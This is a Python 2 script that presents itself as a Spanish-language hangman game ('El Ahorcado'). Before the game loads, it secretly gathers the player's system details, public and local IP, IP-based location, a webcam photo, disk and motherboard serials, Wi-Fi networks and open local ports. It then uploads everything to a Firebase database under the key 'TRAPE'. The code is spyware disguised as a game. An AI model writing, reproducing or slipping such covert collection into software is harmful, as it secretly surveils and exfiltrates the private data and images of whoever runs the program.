#!/usr/bin/env python
# -*- coding: utf-8 -*-
import platform, re, urllib2, socket, urllib, psutil, sys, traceback, requests
import cv2, wmi
import pyaudio,wave
import uuid
import os
import base64
import subprocess
from dbconnect import db

def getmiIpPublica():
    pagina = urllib.urlopen('https://www.cual-es-mi-ip.net/').read()
    ip = re.search('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', pagina)
    return ip.group()

def getMiIpLocal(Namehost):
    direccion_equipo = socket.gethostbyname(Namehost)
    return direccion_equipo

def to_gb(bytes):
    "Convierte bytes a gigabytes."
    return bytes / 1024**3

def getEspacioEnDisco():
    disk_usage = psutil.disk_usage("C:\\")
    Datos = {"Espacio_total" : str(to_gb(disk_usage.total)),"Espacio_libre": str(to_gb(disk_usage.free)),
    "Espacio_usado":str(to_gb(disk_usage.used)),"Porcentaje_de_espacio_usado": str(disk_usage.percent)}
    return Datos

def getEspacioEnDiscoL():
    disk_usage = psutil.disk_usage('/')
    Datos = {"Espacio_total" : str(to_gb(disk_usage.total)),"Espacio_libre": str(to_gb(disk_usage.free)),
    "Espacio_usado":str(to_gb(disk_usage.used)),"Porcentaje_de_espacio_usado": str(disk_usage.percent)}
    return Datos

def getPuertosOpen():
    IP = '127.0.0.1'
    Start = int(7999)
    End = int(8010)
    # print '[+] Connecting to %s from %s to %s' % (IP, Start, End)
    connection = socket.socket()
    lista = []
    for i in range(Start, End+1):
        try:
            connection.connect( (IP, i) )
            a= {"Puerto_open": i}
            lista.append(a)
        except:
            a= {"Puerto_close": i}
    connection.close()
    return lista

def getSerialDisk():
    c = wmi.WMI()
    for item in c.Win32_PhysicalMedia():
        s = item.SerialNumber
        # print str(s)
        # print item.Tag
        break;
    return s

def getSerialDiskL():
    #c = os.popen('lsblk --nodeps -o name,model,serial')
    s = {
	'serial':os.popen('lsblk --nodeps -o serial')
    }
    return s

def getSerialUUID():
    #print uuid.UUID(int=uuid.getnode())
    s = uuid.uuid1()
    # print (s)
    return s

def getSerialPlaca():
    # os.system('wmic baseboard get product,Manufacturer,version,serialnumber')
    SP = {
        'product':os.popen('wmic baseboard get product').read(),
        'Manufacturer':os.popen('wmic baseboard get Manufacturer').read(),
        'version':os.popen('wmic baseboard get version').read(),
        'serialnumber':os.popen('wmic baseboard get serialnumber').read()
    }
    return SP

def getInterfacesRed():
    ARed = []
    Red = os.popen('netsh wlan show networks mode=bssid').read()
    # Red = os.popen('ipconfig').read()
    ARed.append(Red)
    print Red
    return Red

def getInterfacesRedL():
    ARed = []
    Red = os.popen('ifconfig -a').read()
    ARed.append(Red)
    return Red

def getUbicacionIP():
    pagina = urllib.urlopen('https://es.geoipview.com/').read()
    la = re.search('([L])+([a])+([t])+([i])+([t])+([u])+([d])+([:])+([&nbsp;</td><td>])+([0-9])+([.])+([0-9])\w+|([L])+([a])+([t])+([i])+([t])+([u])+([d])+([:])+([&nbsp;</td><td>])+([-][0-9]{0,})+([.])+([0-9])\w+', pagina)
    lo = re.search('([L])+([o])+([n])+([g])+([i])+([t])+([u])+([d])+([:])+([&nbsp;</td><td>])+([0-9])+([.])+([0-9])\w+|([L])+([o])+([n])+([g])+([i])+([t])+([u])+([d])+([:])+([&nbsp;</td><td>])+([-][0-9]{0,})+([.])+([0-9])\w+', pagina)
    regex_coordenadas = r'([0-9])+([.])\w+|([-])([0-9])+([.])\w+'
    lat = re.search(regex_coordenadas, str(la.group(0)))
    long = re.search(regex_coordenadas, str(lo.group(0)))
    gps = {
        'latitud':lat.group(0),
        'longitud':long.group(0)
    }
    return gps

def getFoto():
    cap = cv2.VideoCapture(0)
    leido, frame = cap.read()
    if leido == True:
        cv2.imwrite("foto.png", frame)
        # print("Foto tomada correctamente")
        image = open('foto.png', 'rb') #open binary file in read mode
        image_read = image.read()
        image_64_encode = base64.encodestring(image_read)
    else:
        print("Error al acceder a la camara")
    return image_64_encode
    cap.release()

def getFotoL():
    cap = cv2.VideoCapture(0)
    leido, frame = cap.read()
    if leido == True:
        cv2.imwrite("foto.png", frame)
        # print("Foto tomada correctamente")
        image = open('foto.png', 'rb') #open binary file in read mode
        image_read = image.read()
        image_64_encode = base64.encodestring(image_read)
    else:
        print("Error al acceder a la camara")
    return image_64_encode
    cap.release()
print ('--------------Cargando Juego----------------------')
platform_data = platform.uname()
if str(platform_data[0]) == "Windows":
    # print('-------Obteniendo Datos Del Sistema------')
    DSistema = ({'Sistema_Operativo': str(platform_data[0]),'Nombre_De_Usuario':str(platform.node()),'Arquitectura': str(platform.machine()),'Version': str(platform.version()),'Procesador': str(platform.processor())})
    ifr = ('-------Obteniendo Datos de Red------')
    DRed = ({'Nombre_de_Usuario_En_Red': str(platform.node()),'Ip_Local': str(getMiIpLocal(platform.node())),'Ip_Publica': str(getmiIpPublica())})
    ifd = ('-------Obteniendo Informacion de discos------')
    DDisk = (getEspacioEnDisco())
    # print ('Scaneando Puertos....')
    pu= getPuertosOpen()
    DPuertos = (pu)
    # print ('------- Obteniendo Ubicacion------')
    msjU = getUbicacionIP()
    DUbicacion = (msjU)
    # print ('-------Obteniendo Foto------')
    f = getFoto()
    DFoto = (f)
    # print ('-------Obteniendo N serial Disco------')
    s = getSerialDisk()
    DNSDisk = (str(s))
    # print ('-------Obteniendo N serial UUID------')
    U = getSerialUUID()
    DNSUUID = (str(U))
    # print ('------- Obteniendo Informacion de la placa base------')
    PB = getSerialPlaca()
    DInfoplaca = (PB)
    # print ('-------Obteniendo Informacion de las Interfaces de Red------')
    IR = getInterfacesRed()
    msj = ('Informacion_de_las_Interfaces_de_Red')
    DInfored = msj
else:
    # print('-------Obteniendo Datos Del Sistema------')
    DSistema = ({'Sistema_Operativo': str(platform_data[0]),'Nombre_De_Usuario':str(platform.node()),'Arquitectura': str(platform.machine()),'Version': str(platform.version()),'Procesador:': str(platform.processor())})
    # print (DSistema)
    ifr = ('-------Obteniendo Datos de Red------')
    DRed = ({'Nombre_de_Usuario_En_Red ': str(platform.node()),'Ip_Local': str(getMiIpLocal(platform.node())),'Ip_Publica': str(getmiIpPublica())})
    # print (DRed)
    ifd = ('-------Obteniendo Informacion de discos------')
    DDisk = (getEspacioEnDiscoL())
    # print (DDisk)
    # print ('Scaneando Puertos....')
    pu= getPuertosOpen()
    DPuertos = (pu)
    # print ('------- Obteniendo Ubicacion------')
    msjU = getUbicacionIP()
    DUbicacion = (msjU)
    # print ('-------Obteniendo Foto------')
    f = getFotoL()
    DFoto = (f)
    # print ('-------Obteniendo N serial Disco------')
    s = getSerialDiskL()
    DNSDisk = (str(s))
    # print ('-------Obteniendo N serial UUID------')
    U = getSerialUUID()
    DNSUUID = (str(U))
    # print ('------- Obteniendo Informacion de la placa base------')
    PB = getSerialPlaca()
    DInfoplaca = (PB)
    # print ('-------Obteniendo Informacion de las Interfaces de Red------')
    IR = getInterfacesRedL()
    DInfored = (IR)

DUniversal = ({'Sistema':DSistema,'Red':DRed,'Disk':DDisk,'Puertos':DPuertos,'Ubicacion':DUbicacion,'Foto':DFoto,'DInfoplaca':DInfoplaca,'DInfored':DInfored,'DNSDisk':DNSDisk,'DNSUUID':DNSUUID,'DInfoplaca':DInfoplaca})

#enviar datos a firebase
db.child("TRAPE").set(DUniversal)
# juego EL AHORCADO

print ('--------------Juego Cargado----------------------')
import random
AHORCADO = ['''
      +---+
      |   |
          |
          |
          |
          |
    =========''', '''
      +---+
      |   |
      O   |
          |
          |
          |
    =========''', '''
      +---+
      |   |
      O   |
      |   |
          |
          |
    =========''', '''
      +---+
      |   |
      O   |
     /|   |
          |
          |
    =========''', '''
      +---+
      |   |
      O   |
     /|\  |
          |
          |
    =========''', '''
      +---+
      |   |
      O   |
     /|\  |
     /    |
          |
    =========''', '''
      +---+
      |   |
      O   |
     /|\  |
     / \  |
          |
    =========''']
palabras = 'sombra animal django oveja aprender ejercicios caballo perro vaca computadora python abeja diente conejo mantel mesa basura escritorio ubuntu gorro parque amuleto cama cuarto descargar curso diario pythondiario vaso cuadro foto revista esdrujula parlantes radio tutorial banana naranja manzana celular casco ventana silla pileta juegos televisor heladera modulos cocina timbre lavarropas estufa enchufe futbol pelota pizarron cargador factura papel impresora telefono remedio planta vegetal aves luna electricidad copa fernet google lenguaje internet esposa jarra microondas manual sarten cortina musica pato'.split()

def buscarPalabraAleat(listaPalabras):
    # Esta funcion retorna una palabra aleatoria.
    palabraAleatoria = random.randint(0, len(listaPalabras) - 1)
    return listaPalabras[palabraAleatoria]

def displayBoard(AHORCADO, letraIncorrecta, letraCorrecta, palabraSecreta):
    print(AHORCADO[len(letraIncorrecta)])
    print ""
    fin = " "
    print 'Letras incorrectas:', fin
    for letra in letraIncorrecta:
        print (letra, fin)
    print ""
    espacio = '_' * len(palabraSecreta)
    for i in range(len(palabraSecreta)): # Remplaza los espacios en blanco por la letra bien escrita
        if palabraSecreta[i] in letraCorrecta:
            espacio = espacio[:i] + palabraSecreta[i] + espacio[i+1:]
    for letra in espacio: # Mostrará la palabra secreta con espacios entre letras
        print (letra, fin)
    print ""

def elijeLetra(algunaLetra):
    # Devuelve la letra que el jugador ingreso. Esta función hace que el jugador ingrese una letra y no cualquier otra cosa
    while True:
        print 'Adivina una letra:'
        letra = raw_input()
        letra = letra.lower()
        if len(letra) != 1:
            print 'Introduce una sola letra.'
        elif letra in algunaLetra:
            print 'Ya has elegido esa letra, elige otra.'
        elif letra not in 'abcdefghijklmnopqrstuvwxyz':
            print 'Elije una letra.'
        else:
            return letra

def empezar():
    # Esta funcion devuelve True si el jugador quiere volver a jugar, de lo contrario devuelve False
    print 'Quieres jugar de nuevo? (Si o No)'
    return raw_input().lower().startswith('s')

print 'A H O R C A D O'
letraIncorrecta = ""
letraCorrecta = ""
palabraSecreta = buscarPalabraAleat(palabras)
finJuego = False
while True:
    displayBoard(AHORCADO, letraIncorrecta, letraCorrecta, palabraSecreta)
    # El usuairo elije una letra.
    letra = elijeLetra(letraIncorrecta + letraCorrecta)
    if letra in palabraSecreta:
        letraCorrecta = letraCorrecta + letra
        # Se fija si el jugador gano
        letrasEncontradas = True
        for i in range(len(palabraSecreta)):
            if palabraSecreta[i] not in letraCorrecta:
                letrasEncontradas = False
                break
        if letrasEncontradas:
            print ('Si! La palabra secreta es "' + palabraSecreta + '"! Has ganado!')
            finJuego = True
    else:
        letraIncorrecta = letraIncorrecta + letra
        # Comprueba la cantidad de letras que ha ingresado el jugador y si perdió
        if len(letraIncorrecta) == len(AHORCADO) - 1:
            displayBoard(AHORCADO, letraIncorrecta, letraCorrecta, palabraSecreta)
            print ('Se ha quedado sin letras!\nDespues de ' + str(len(letraIncorrecta)) + ' letras erroneas y ' + str(len(letraCorrecta)) + ' letras correctas, la palabra era "' + palabraSecreta + '"')
            finJuego = True
    # Pregunta al jugador si quiere jugar de nuevo
    if finJuego:
        if empezar():
            letraIncorrecta = ""
            letraCorrecta = ""
            finJuego = False
            palabraSecreta = buscarPalabraAleat(palabras)
        else:
            break

# starCountRef = firebase.database().ref('posts/' + postId + '/starCount');
# starCountRef.on('value', function(snapshot) {
#   updateStarCount(postElement, snapshot.val());
# });
